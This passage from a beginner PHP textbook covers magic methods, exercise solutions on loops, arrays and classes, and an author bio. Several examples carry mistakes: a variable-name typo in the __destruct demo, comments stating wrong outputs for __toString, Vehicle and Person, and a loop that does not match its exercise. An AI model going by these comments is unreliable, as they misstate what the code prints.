With traits, developers can group similar functionalities together in one place, avoiding code duplication and simplifying the management of shared functionalities. In addition, traits allow for a clearer organization of code, promoting the separation of concerns and facilitating understanding of program structure.

 

In short, the judicious use of traits in PHP can greatly contribute to improving the quality, robustness and flexibility of applications, while facilitating the code development and maintenance process.

 

# Chapter 21

# Magic methods

 

 

Magic methods in PHP offer a powerful way of extending the behavior of objects beyond the methods explicitly defined in a class. They enable certain interactions with objects to be captured and handled automatically, offering remarkable flexibility in the design and management of PHP applications.

 

In this chapter, we'll explore in detail the magic methods available in PHP and their practical use. We'll discover how these methods can be used to customize the behavior of objects in various contexts, thereby improving the modularity, reusability and maintainability of PHP code.

 

Magic methods enable developers to define custom behaviors for operations such as instantiating an object, accessing undefined properties, calling inaccessible methods, serializing objects, and so on. They offer remarkable flexibility in managing interactions with objects, facilitating the development of robust, flexible PHP applications.

 

With an in-depth understanding of magic methods, developers will be able to extend the functionality of their PHP applications elegantly and efficiently, while avoiding common pitfalls and following development best practices.

 

## Defining magic methods

PHP magic methods are special methods predefined in a class, which are automatically invoked by the PHP engine in response to certain interactions with objects in that class. They generally begin with two underscores (\_\_) and provide special functionality to control the behavior of objects in particular situations. Magic methods enable developers to customize object behavior, including operations such as object instantiation, access to inaccessible properties, calling non-existent methods, serialization and deserialization, among others.

## Main magic methods

PHP offers a number of so-called magic methods, and in this section we'll look at some of the most commonly used.

 

1.  **\_\_construct()**

 

The \_\_construct() method is called automatically when an object is instantiated. It is called "Constructor". It is used to initialize object properties or perform other necessary operations before the object is used.

 

1.  **\_\_get()**

The \_\_get() method is used to intercept attempts to read inaccessible object properties. It can be used to implement customized behavior for this operation.

 

Here's an example of how to use \_\_get:

 

<?php  
  
 class Users {  
 private $name \= "John";  
}  
 $user \= new Users();  
 echo $user->name; // Error: property is private

 

?>

 

 

In this code, a User class is defined with a private property $name. When we try to access this property after instantiating the class, an error is generated because the property is declared as private and therefore inaccessible from outside the class. If we redefine the \_\_get magic method in the User class, the error disappears.

 

 

 <?php  
 class Users {  
 private $name \= "John";  
  
 public function \_\_get($propertyName) {  
 if ($propertyName \== 'name') {  
 return $this\->name;  
 }  
 }  
 }  
  
$user = new Users();  
  
// Using the magic method \_\_get() to access the private property  
echo $user\->name; // Displays "John"  
?>

 

 

In this code, the \_\_get() method is a PHP magic method that is called automatically when an attempt is made to access an inaccessible object property.

 

In this example, the \_\_get() method is defined for the User class. When trying to access an inaccessible property of the class, this method is invoked with the property name as argument.

 

In the body of the method, we check whether the property name passed as an argument corresponds to 'name'. If so, the value of the object's private property $name is returned to the caller.

 

This magic method provides controlled access to a private property, returning it only when the requested property name matches that of the object's private property. Execution of this code will produce the following display:

 

![Image](images/image-202.png)

 

1.  **\_\_set()**

 

Now suppose we want to modify the value of the "name" property from outside the "User" class. Again, this property is private, so we get an error if we try to do so directly. We can use the magic \_\_set() method to allow this property to be modified in a controlled way. Here's an example:

 

<?php  
 class Users {  
 private $name;  
  
 public function \_\_set($propertyName, $value) {  
 if ($propertyName \== 'name') {  
 $this\->name \= $value;  
 }  
 }  
 }  
  
 $user = new Users();  
  
 // Use the \_\_set() magic method to modify the private property  
 $user\->name = "Lina"; // The "name" property is now set to "Lina".

 

 

In this example, the User class defines a private property $name. The \_\_set() magic method is used to intercept attempts to assign values to inaccessible object properties.

 

When we try to assign a value to the "name" property of the $user object, the \_\_set() method is automatically invoked. It receives two arguments: the name of the property to be modified and the value to be assigned to it.

 

In the body of the \_\_set() method, we check whether the name of the property passed corresponds to "name". If so, the value supplied is assigned to the object's $name property.

 

This magic method allows you to modify a private property of the User class in a controlled way, by intercepting and processing attempts to assign values to this property.

 

1.   **\_\_call() and \_\_callStatic()**

 

The magic \_\_call() method is invoked when we attempt to call a method that doesn't exist or is inaccessible from an object. It receives two arguments: the name of the attempted method and any associated arguments, which are then converted into an array.

As for the magic \_\_callStatic() method, it is triggered when we try to use a method that doesn't exist or is inaccessible in a static context. This method accepts the same arguments as \_\_call().

Example of the \_\_call() method:

 

<?php  
 class Example {  
 public function \_\_call($lastNameMethod, $arguments) {  
 echo "The method '$lastNameMethod' does not exist or is inaccessible.";  
 echo "The arguments passed are: " . implode(', ', $arguments);  
 }  
 }  
 $object1 = new Example();  
 $object1\->methodNotExist("argument1", "argument2");

 

In this example, we have an “Example” class with a magic **\_\_call()** method. When we try to call a method methodNotExist() on the object $objet1, this method doesn't exist in the class. Consequently, the **\_\_call()** method is invoked automatically. It displays a message indicating that the method does not exist, as well as the arguments passed to this method.

Execution of this code will produce the following display:

 

![Image](images/image-203.png)

 

This result clearly shows that the magic \_\_call method has been executed instead of the non-existent method, since the latter doesn't exist.

 

Example of the \_\_callStatic() method:

 

<?php  
  
 class Example {  
 public static function \_\_callStatic($lastNameMethod, $arguments) {  
 echo "The static method '$lastNameMethod' does not exist or is inaccessible.";  
 echo "The arguments passed are: " . implode(', ', $arguments);  
 }  
 }

  
Example::staticMethodNotExist("argument1", "argument2");

 

 

In this example, we have an Example class with a **\_\_callStatic()** magic method. When we try to call a static method staticMethodNotExist() on the “Example” class, this method doesn't exist in the class. Consequently, the \_\_callStatic() method is invoked automatically. It displays a message indicating that the static method does not exist, as well as the arguments passed to this method.

 

![Image](images/image-204.png)

 

1.  **\_\_toString()**

 

The \_\_toString() method is called automatically when an object is used in a context where a character string is expected, for example when it is passed to the echo function. It defines the string representation of the object.

 

  
<?php  
 class Example {  
 private $name;  
  
 public function \_\_construct($name) {  
 $this\->name \= $name;  
 }  
  
 public function \_\_toString() {  
 return "This object is called " . $this\->name;  
 }  
 }

  
 $object1 = new Example("NameObject1");  
 echo $object1; // Display : This object is called Example

 

 

In this example, the Example class defines a magic **\_\_toString()** method. When we attempt to display the object $object1 using echo or string concatenation, the \_\_toString() method is automatically invoked. This method returns a string that represents the object in a meaningful way.

 

![Image](images/image-205.png)

 

 

1.  **\_\_destruct()**

 

The \_\_destruct() method is invoked automatically just before the object is destroyed. It is used to perform cleanup operations or release resources associated with the object.

 

  
 <?php  
  
 class Example {  
 public function \_\_destruct() {  
 echo "The object has been destroyed.";  
 }  
 }  
  
 $object1 = new Example();  
 unset($objetc1); // Explicit object destruction. Displays: The object has been destroyed.

 

 

In this example, the Example class defines a magic **\_\_destruct()** method. This method is automatically called when the object is destroyed, either explicitly using the **unset()** function, or implicitly when the script ends. In this case, when we use **unset($object1)** to destroy the object $object1, the \_\_destruct() method is invoked and displays a message indicating that the object has been destroyed.

 

![Image](images/image-206.png)

 

## Conclusion

PHP's magic methods offer powerful flexibility for customizing the behavior of objects and classes. They enable automatic intervention during various interactions with objects, making code management and extension easier.

 

In this chapter, we've explored some of the most commonly used magic methods, such as **\_\_get(), \_\_set(), \_\_call(), \_\_callStatic(), \_\_toString()** and **\_\_destruct()**. These methods provide useful functionality for managing access to properties, calling methods dynamically, displaying objects as strings and performing actions when objects are destroyed.

 

It's worth noting that there are other magic methods in PHP, such as \_\_isset(), \_\_unset(), \_\_invoke(), \_\_clone(), and others, which offer additional functionality to meet specific development needs.

 

By judiciously exploiting these magic methods, PHP developers can make their code more flexible, more robust and easier to maintain, while benefiting from greater expressiveness in the design of their applications.

 

 

# Exercises correction

 

 

 

### Exercise 1

 

Write a PHP script that defines a name variable containing your name and an age variable containing your age. Next, the script should display a message that says: "Hello \[your name\], you're \[your age\] years old!".

 

 

 

 

### Correction

 

<?php  
 $name \= "John"; // replace with your name  
 $age \= 30; // replace with your age  
  
 echo "Hello $name, you are $age years old!";  
?>

 

 

### Exercise 2

 

Write a PHP script that stores a person's last name, first name and age in variables and displays this information in the form of a sentence using the concatenation operator.

 

 

 

 

### Correction

 

<?php  
 $lastname \= "Strock";  
 $firstname \= "John";  
 $age \= 30;  
  
 echo "Hello, my name is ".$firstname." ".$lastname." and I'm ".$age." years old.";  
?>

 

 

### Exercise 3

Write a PHP program that stores the price of a product in a $price variable, a quantity in a $quantity variable, and calculates and displays the total amount of the order by multiplying the price by the quantity.

 

###  

###  

### Correction

 

 <?php  
 $price \= 39; // unit price  
 $quantity \= 7; // quantity ordered  
 $total \= $price \* $quantity; // calculate total amount  
 echo "The total amount of the order is : $total euros";  
 ?>

 

### Exercise 4

Write a script that checks whether a number stored in a variable is positive, negative or zero.

 

 

### Correction

 

<?php   
 $number \= 34;  
 if ($number \> 0) {  
 echo "The number is positive.";  
 } elseif ($number < 0) {  
 echo "The number is negative.";  
 } else {  
 echo "The number is zero";  
 }

?>

###  

### Exercise 5

Write a program to check students' skill development assessed on a scale of 100 using conditional instructions.

\-If the competency level is 80% or more, the student will be in the first group.

\-If the degree of competence is between 50% and 80%, the student will be in the second group.

\-If the degree of competence is between 30% and 50%, the student will be in the third group.

\-If the competency level is below 30%, the student will fail.

 

###  

###  

###  

 

### Correction

 

<?php   
  
 $degreeSkills = 60;  
  
 if ($degreeSkills\>=80) {  
 $group = "Group 1";  
 } elseif($degreeSkills\>=50) {  
 $group = "Group 2";  
 } elseif($degreeSkills\>=30) {  
 $group = "Group 3";  
 } else {  
 $group = "Failure";  
 }  
  
echo "Student assignment group: $group";

 

 

### Exercise 6

 

 

Write a conditional script to test whether a number is a multiple of both 3 and 5.

 

 

 

 

###  

###  

 

### Correction

 

<?php  
 $x\=1325775;  
 if($x%3\==0 AND $x%5\==0) {  
 echo $x . " is a multiple of 3 and 5 <br />";  
 } else {  
 echo $x . " is not a multiple of 3 or 5 <br>"; 

 }  
?>

 

 

 

### Exercise 7

Write a program to display the day of the week (e.g. Monday) based on numbers, using switch statements.

\-Day 1 will be considered as Monday

\-If the number is not between 1 and 7, display "invalid number" by default.

 

 

 

### Correction

 

<?php $day \= "3";  
  
 switch ($day) {  
 case "1":  
 echo "It's Monday!";  
 break;

  
 case "2":  
 echo "It's Tuesday!";  
 break;

  
 case "3":  
 echo "It's Wednesday!";  
 break;

  
 case "4":  
 echo "It's Thursday!";  
 break;

  
 case "5":  
 echo "It's Friday!";  
 break;

  
 case "6":  
 echo "It's Saturday!";  
 break;  
 case "7":

  
 echo "It's Sunday! ";  
 break;

  
 default:  
 echo "Invalid number!";  
}

 

### Exercise 8:

 

Write a program to display integers from 10 to 50, using the while loop.

 

 

###  

###  

### Correction

 

<?php  
 $nb \= 10;  
 while($nb <= 50) {  
 echo $nb;  
 echo "<br\>" ;  
  
 $nb++;  
 }

 

 

### Exercise 9

 

Using the for loop, write a program to calculate the product of all integers from 1 to 20 (1x2x3x4x5x.....x19x20).

Then display the result.

 

 

 

 

 

### Correction

 

<?php  
 $product = 1;  
  
 for ($x\=1; $x<=20; $x++) {  
 $product = $product \* $x;  
 }  
  
 echo "The product of all numbers from 1 to 20 is $product";

 

 

###  

### Exercise 10

 

Write the multiplication table of 7 (for all numbers from 1 to 100), using a for loop. This table should be presented as an unordered list.

 

 

 

 

###  

### Correction

 

<?php  
 echo '<ul>';  
 for($i = 1; $i <= 10; $i++)  
 echo '<li>' . $i . ' x 7 = ' . ($i \*7) . '</li>';  
 echo '</ul>';

 

 

###  

### Exercise 11

###  

Write a program to calculate the following sum:

 

1+3+3² + 3³ + 3⁴ + 3⁵ + ... ... + 3^(20)

 

###  

###  

###  

###  

### Correction

 

<?php  
 $x \= 3;  
 $n \= 20;  
 $sum \= 0;  
  
 for ($i=0; $i<= $n; $i++) {  
  $term \= $x\*\*$i;  
  $sum \= $sum \+ $term;  
 }  
  
 echo $sum;

 

?>

 

 

###  

### Exercise 12

 

Write a function that tests whether a number is a multiple of 3 and displays a message depending on the result of this test.

###  

### Correction

 

 

 

Correction

 

 

<?php  
  
 function multiples\_of\_three($x){  
  
 if($x % 3 == 0){  
 echo "The number $x is a multiple of 3";  
 } else {  
 echo "The number $x is not a multiple of 3";  
 }  
 }  
  
 multiples\_of\_three(3672);  
 echo "<br>";  
 multiples\_of\_three(10);  
  
?>

 

 

###  

### Exercise 13:

###  

Write a PHP function that takes three numbers as input and returns the largest of these three numbers.

###  

###  

###  

###  

 

### Correction

 

<?php  
 function greaterNumbers($number1, $number2, $number3) {  
 $bigNumber = $number1;  
  
 if ($number2 > $bigNumber) {  
 $bigNumber = $number2;  
 }  
  
 if ($number3 > $bigNumber) {  
 $bigNumber = $number3;  
 }  
 return $bigNumber;  
 }  
 //Example of use  
 echo greaterNumbers(2,7,-9);

 

 

### Exercise 14:

Write a function to display the random number needed to find a two-digit integer given as a parameter.

 

 

 

### Correction: Using the while loop

 

<?php  
 function find\_number($number){  
  
 $Number\_of\_prints = 0;  
 $Random\_number = -1;  
  
 while($Random\_number != $number){  
 $Random\_number = random\_int(0, 100);  
 $Number\_of\_prints++;  
 echo $Random\_number ."<br>";  
 }  
  
  echo "The number ".$number. " is found after ".$Number\_of\_prints. "trials";  
 }  
  
 //Call focus  
 find\_number(43);

 

 

### Exercise 15

###  

Write a PHP script that stores a list of names in an array, then displays these names in a bulleted list.

###  

###  

###  

###  

###  

### Correction

 

<?php  
 $names \= array("Alice", "Bob", "Mohammed" , "Charlie", "David", "Sara", "Eve");  
  
 echo "<ul\>";  
 foreach ($names as $name) {  
 echo "<li\>".$name."</li\>";  
}

  
 echo "</ul\>";

 

 

### Exercise 16:

 

Write a PHP script that stores the names of three colors in an array and displays them in reverse order.

 

###  

###  

###  

###  

### Correction

 

<?php   
 $colors = array("red", "green", "blue");  
 $reverseColors = array\_reverse($colors);  
  
 foreach ($reverseColors as $color) {  
 echo $color . "<br>";  
 }

###  

 

### Exercise 17:

 

Write a PHP script that stores a list of names in an array and displays them in alphabetical order.

 

 

 

 

 

### Correction

 

<?php  
  
 $firstnames = array("Julie", "Paul", "Marie", "Luc", "Anne");  
  
 sort($firstnames);  
  
 foreach ($firstnames as $firstname) {  
 echo $firstname."<br>";  
 }

 

 

### Exercise 18:

 

Write a PHP script that creates an associative array of fruit names and prices and displays each element of the array with a foreach loop.

###  

###  

###  

###  

### Correction

 

<?php  
 $fruits \= array(  
 "apple" => 2.5,  
 "banana" => 1.8,  
 "orange" => 3.2,  
 "kiwi" => 4.0,  
 "pineapple" => 6.5  
 );  
  
 foreach ($fruits as $fruit \=> $price) {  
 echo "The price of a ".$fruit." is ".$price." euros.<br\>";  
 }

 

### Exercise 19

Write a multidimensional associative array whose keys are people's names and values are numbered arrays containing the person's first name, city and age.

Then use this table to display a sentence for each of these people, giving the person's first and last name and age.

 

 

 

###  

###  

###  

###  

### Correction

 

<?php   
 $tab\=array(  
 "Winder"=>array("Pierre", "New York",53),  
 "Bikri"=>array("Amine", "Chicago",23),  
 "Dupont"=>array("Christpher", "Boston",19)  
 );  
  
  
 foreach ($tab as $key => $value) {  
 echo "The age of: ".$key." ".$value\[0\]." is: ".$value\[2\]."<br>";  
 }

 

You can call the **print\_r($tab)** function to see the result.

### Exercise 20: function and array (foreach)

Write a PHP function that takes an array of numbers as input and returns the sum of all these numbers.

###  

###  

###  

###  

### Correction

 

<?php  
 function sum\_tab($tab) {  
 $sum = 0;  
 foreach ($tab as $number) {  
 $sum += $number;  
 }  
 return $sum;  
 }

 

 

An example of use:

 

 

 $my\_array = array(1, 2, 3, 4, 5);  
 $result = sum\_tab($my\_array);  
 echo "The sum is: " . $result;

 

 

 

### Exercise 21 function and array (foreach)

###  

Write a function that takes an array of numbers as a parameter and returns the sum of all even numbers in the array.

###  

### Correction

 

 

 

### Correction

 

<?php  
  
 function sum\_even\_numbers($tab) {  
 $sum = 0;  
 foreach ($tab as $number) {  
 if ($number % 2 == 0) {  
 $sum += $number;  
 }  
 }  
 return $sum;  
 }

 

 

 

Here's an example:

 

 

  $tab = \[1, 2, 3, 4, 5, 6, 7, 8, 9, 10\];  
 $sum\_even = sum\_even\_numbers($tab);  
 echo $sum\_even; 

 

 

###  

### Exercise 22: functions and tables (averaging)

###  

Write a function that takes an array of numbers as a parameter and returns the average of all even numbers in the array.

###  

###  

###  

###  

###  

### Correction

 

<?php  
  
 function average\_of\_even\_numbers($tab){  
 $sum = 0;  
 $nb\_of\_even\_numbers = 0;  
  
 foreach ($tab as $number) {  
 if($number % 2 == 0){  
 $sum += $number;  
 $nb\_of\_even\_numbers++;  
 }  
 }  
  
 echo $nb\_of\_even\_numbers;  
 echo "<br>";  
 $average = $sum/$nb\_of\_even\_numbers;  
 return $average;  
 }  
  
  
 $tab = \[1,2,6,8,10,9,13,14,20\];  
 echo average\_of\_even\_numbers($tab);

 

 

 

### Exercise 23: functions and tables (find max)

###  

Write a function that takes an array of numbers as a parameter and returns the max of all the numbers in the array.

###  

###  

###  

 

###  

### Correction

 

<?php  
  
 function find\_max\_number($tab) {  
 $max = $tab\[0\];  
 foreach ($tab as $number) {  
 if ($number > $max) {  
 $max = $number;  
 }  
 }  
 return $max;  
 }  
  
 // Example of use  
 $tab = array(100, 20, 56, 876150,12,6, 1000);  
 echo "The maximum value is: " . find\_max\_number($tab);

 

 

 

 

Object-oriented PHP

 

### Exercise 24 (class without constructor)

Write a class representing a city. It must have the properties name, department, region and number of inhabitants and a method displaying "town X is in department Y of region Z and has N inhabitants".

Create city objects, assign their properties and use the display method.

###  

###  

###  

###  

###  

###  

### Correction

 

<?php  
  
 class City {  
 public $name;  
 public $department;  
 public $region;  
 public $inhabitants;  
  
 public function getInfos() {  
 echo "The city " . $this\->name . " is in department: " 

 . $this\->department . " in region " . $this\->region 

 . " and has " . $this\->inhabitants . " inhabitants <br>";  
 }  
 }  
  
 // Creation of city objects  
 $city\_1 = new City();  
  
 $city\_1\->name = "New York City";  
 $city\_1\->department = "New York";  
 $city\_1\->region = "Nord-Est";  
 $city\_1\->inhabitants = 8336817;  
  
 $city\_1\->getInfos();

  
 

 

### Exercise 25

 

Create a Person class with the following attributes: last name, first name, age. The class must have a presentation() method that displays a string containing the person's information.

 

Next, create two objects of type Person with different information and call the presentation() method for each object to display the information for each person.

###  

###  

###  

###  

###  

### Correction

 

<?php  
  
 class Person {  
 public $lastname;  
 public $firstname;  
 public $age;  
  
 public function presentation() {  
 echo "My name is ".$this\->firstname." 

 and I'm ".$this\->lastname." and ".$this\->age." years old.";  
 }  
 }  
  
 // Create two Person objects  
 $person1 = new Person();  
 $person1\->lastname = "Smith";  
 $person1\->firstname = "John";  
 $person1\->age = 30;  
  
 $person2 = new Person();  
 $person2\->lastname = "Dupond";  
 $person2\->firstname = "Jane";  
 $person2\->age = 25;  
  
 // Call presentation() method for each object  
 $person1\->presentation(); // display "My name is John Doe and I'm 30  years old."  
 echo "<br>";  
 $person2\->presentation(); // display "My name is Jane Smith and I'm 25 years old."

 

 

### Exercise 26

Create a Person class containing the following properties:

\-name:       the person's name

\-$age      : the person's age

The Person class must have the following methods:

\-\_\_construct      ($name, $age): a constructor that initializes the name and age properties

\-getName(): a method that returns the person's name

\-getAge(): a method that returns the person's age

\-setAge      ($age): a method that modifies the person's age

 

Create an instance of the Person class and display its name and age. Then modify the person's age and display the new value.

 

###  

 

###  

###  

###  

###  

###  

###  

###  

###  

### Correction

 

<?php  
 class Person {  
 private $name;  
 private $age;  
  
 public function \_\_construct($name, $age) {  
 $this\->name \= $name;  
 $this\->age \= $age;  
 }  
  
 public function getName() {  
 return $this\->name;  
 }  
  
 public function getAge() {  
 return $this\->age;  
 }  
  
 public function setAge($age) {  
 $this\->age \= $age;  
 }  
 }

  
 $person1 = new Person("John Doe", 30);  
 echo "Name : " . $person1\->getName() . "<br>";  
 echo "Age : " . $person1\->getAge() . "<br>";  
  
 $person1\->setAge(35);  
 echo "New age : " . $person1\->getAge() . "<br>";

 

### Exercise 27

Create a class Vehicle with the following attributes: brand, model, year, price. The attributes should be defined in the constructor.

 

The class should have getters and setters for each attribute, as well as a display() method that displays the vehicle information as a string.

 

Then, create an object (vehicle1) of type Vehicle with initial information and use the display() methods and setters to modify the information of the created vehicle1.

 

###  

 

###  

###  

###  

###  

###  

###  

###  

### Correction

 

<?php  
 class Vehicle {  
 private $brand;  
 private $model;  
 private $year;  
 private $price;  
  
 public function \_\_construct($brand, $model, $year, $price) {  
 $this\->brand \= $brand;  
 $this\->model \= $model;  
 $this\->year \= $year;  
 $this\->price \= $price;  
 }  
  
 public function getBrand() {  
 return $this\->brand;  
 }  
  
 public function setBrand($brand) {  
 $this\->brand \= $brand;  
 }  
  
 public function getModel() {  
 return $this\->model;  
 }  
  
 public function setModel($model) {  
 $this\->model \= $model;  
 }  
  
 public function getYear() {  
 return $this\->year;  
 }  
  
 public function setYear($year) {  
 $this\->year \= $year;  
 }  
  
 public function getPrice() {  
 return $this\->price;  
 }  
  
 public function setPrice($price) {  
 $this\->price \= $price;  
 }  
  
 public function display() {  
 echo "Vehicle ".$this\->brand." ".$this\->model." year ".$this\->year." - Price: ".$this\->price." euros";  
 }  
 }  
  
 // Create an object of type Vehicle  
 $vehicle1 = new Vehicle("Mercedes", "C220", 2015, 27000);  
  
 // Use methods to modify vehicle information  
 $vehicle1\->setYear(2018);  
 $vehicle1\->setPrice(15000);  
  
 // Display vehicle information  
 $vehicle1\->display(); // affiche "Vehicle Peugeot 308 year 2018 - Price: 15000 euros"

 

 

### Exercise 28 (continuation of previous exercise) :

Create a Car class that inherits from the Vehicle class, with an additional attribute named number\_doors. The Car class should also have a constructor that takes this additional attribute into account.

 

The Car class should have getters and setters for the number\_doors attribute, as well as a display() method that displays the car's information as a string, while also calling the display() method of the parent class.

 

Then, create an object of type Car with initial information and use the display() methods and setters to modify the car's information.

 

###  

 

###  

###  

###  

 

###  

###  

### Correction

 

<?php  
 require\_once "Vehicle.php";  
 class Car extends Vehicle {  
 private $number\_doors;  
  
 public function \_\_construct($brand, $model, $year, $price, $number\_doors) {  
 parent::\_\_construct($brand, $model, $year, $price);  
 $this\->number\_doors \= $number\_doors;  
 }  
  
 public function getNumberDoors() {  
 return $this\->number\_doors;  
 }  
  
 public function setNumberDoors($number\_doors) {  
 $this\->number\_doors \= $number\_doors;  
 }  
  
 public function display() {  
 parent::display();  
 echo " - ".$this\->number\_doors." doors";  
 }  
 }  
  
 // Create an object of type Car  
 $car1 = new Car("Mercedes", "C220", 2024, 45000, 5);  
 $car1\->display();

 

 

 

 

 

 

# Encouragement and Congratulations

 

Dear reader,

 

Congratulations on completing this exciting journey through the inner workings of PHP and MySQL, from discovery to mastery. You've successfully completed each chapter, assimilating fundamental concepts and honing your skills along the way.

 

A Learning Journey

Your commitment to learning web development with PHP and MySQL has been remarkable. Understanding the intricacies of PHP programming, mastering MySQL queries, and exploring the possibilities of web development are notable achievements. We hope this book has been a valuable resource in your learning journey.

 

Practical Application

Don't forget the importance of practical application. Use what you've learned to create, explore and experiment. Hands-on projects are cornerstones of mastery, so don't hesitate to put what you've learned into practice. Below are our video training courses for learning by doing.

 

Learning continuity

The world of web development is dynamic, and it's crucial to keep learning. We recommend that you continue your training in Advanced Object-Oriented PHP, then MVC architecture in Object-Oriented PHP and finally Frameworks such as Laravel, symfony etc.

 

You're a Web Developer!

Congratulations, you've acquired the skills to be a web designer. Whether you choose to build personal websites, contribute to open source projects, or pursue a professional career, you've got the foundation you need.

 

Staying Connected

Our journey together doesn't end here. Let's stay connected! Join online communities, share your achievements, ask questions and continue to evolve. Web development is a collective adventure, and now you're part of this exciting community.

 

A big well done!

On behalf of the entire team behind this book, we'd like to extend our warmest congratulations. Your commitment to learning is inspiring, and we look forward to seeing the wonderful creations you develop in the future.

 

What bonuses await you in this book?

 

 

*   **If you have any questions or encounter any difficulties, please do not hesitate to contact us:** contact@skilldeve.com

 

 

 

 

 

 

 

 

 

 

# About the author

 

 

 

Maximilien Lambert is an experienced web developer and trainer in the field of digital technologies. With his recognized expertise, he has led numerous international training courses and seminars at world-renowned institutions. His exceptional pedagogical approach has earned him a reputation for excellence among his students, thanks to his ability to simplify complex concepts and make them accessible to all.

 

A university lecturer for over 20 years, Maximilien Lambert shares his passion for learning and passing on IT knowledge. His long experience in the educational field enables him to inspire several generations of learners around the world, passing on not only technical skills, but also a global vision of the web development sector.

 

Passionate about sharing knowledge, Maximilien Lambert excels at imparting computer skills, inspiring generations of learners around the world. In addition to his teaching activities, he offers specialized training to professionals, helping them hone their skills and stay at the cutting edge of their respective fields.

 

His dedication to excellence, his passion for teaching and his technical expertise make Maximilien Lambert an essential reference in the field of web development and digital training.